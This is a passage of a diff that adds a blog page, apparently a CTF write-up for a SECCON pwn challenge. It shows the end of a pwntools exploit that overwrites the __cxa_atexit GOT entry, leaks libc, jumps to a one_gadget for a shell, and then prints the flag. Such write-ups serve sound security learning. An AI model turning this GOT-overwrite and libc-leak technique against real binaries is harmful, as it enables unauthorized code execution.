+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># T.finish.last</span>
+</span></span><span style="display:flex;"><span>    s_push(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__cxa_atexit&#39;</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x1000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Overwrite __cxa_atexit</span>
+</span></span><span style="display:flex;"><span>    t_push(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;main&#34;</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">95</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Overlap T with name</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+</span></span><span style="display:flex;"><span>        s_pop()
+</span></span><span style="display:flex;"><span>    s_push(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;_Z4nameB5cxx11&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Overwrite name</span>
+</span></span><span style="display:flex;"><span>    t_push(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__cxa_atexit&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hello, &#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hello, &#34;</span>)
+</span></span><span style="display:flex;"><span>    libc_leak <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>))
+</span></span><span style="display:flex;"><span>    success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc leak: </span><span style="color:#e6db74">{</span>hex(libc_leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x471f0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    s_pop()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># T.finish.cur</span>
+</span></span><span style="display:flex;"><span>    s_push(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__cxa_atexit&#39;</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48</span>) <span style="color:#75715e"># ios_good</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># T.finish.first</span>
+</span></span><span style="display:flex;"><span>    s_push(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__cxa_atexit&#39;</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># T.finish.last</span>
+</span></span><span style="display:flex;"><span>    s_push(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__cxa_atexit&#39;</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x1000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+</span></span><span style="display:flex;"><span>        s_pop()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    s_push(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    t_push(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> ONE_GADGET)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit(main(sys<span style="color:#f92672">.</span>argv))
+</span></span></code></pre></div><p><strong>FLAG:</strong> <code>SECCON{y0u_uNd3Rs74nd_H0w_t0_3xpLo1t_tH3_&quot;stack&quot;}</code></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://leo1.cc/">leo_something</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+    const images = Array.from(document.querySelectorAll(".post-content img"));
+    images.forEach(img => {
+        mediumZoom(img, {
+            margin: 0,  
+            scrollOffset: 40,  
+            container: null,  
+            template: null,  
+            background: 'rgba(0, 0, 0, 0.8)'
+        });
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
